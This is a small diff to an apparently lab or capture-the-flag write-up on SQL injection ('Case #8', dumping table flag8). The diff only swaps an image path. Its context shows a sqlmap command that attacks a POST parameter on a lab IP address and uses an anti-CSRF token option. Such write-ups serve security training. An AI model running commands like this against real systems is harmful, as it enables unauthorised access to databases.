@@ -87,7 +87,7 @@ What's the contents of table flag8? (Case #8)
 
 We can see a Sqli with POST method in parameter id and anti-CSRF
 
-<figure><img src="../../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
 
 ```
 sqlmap 'http://94.237.57.57:43651/case8.php' -X POST --data="id=1&t0ken=hwg6OrC2k8UGNUnITV3vnZ3EIHih3GA9HiONXgWDY" --csrf-token="t0ken" --batch -p id
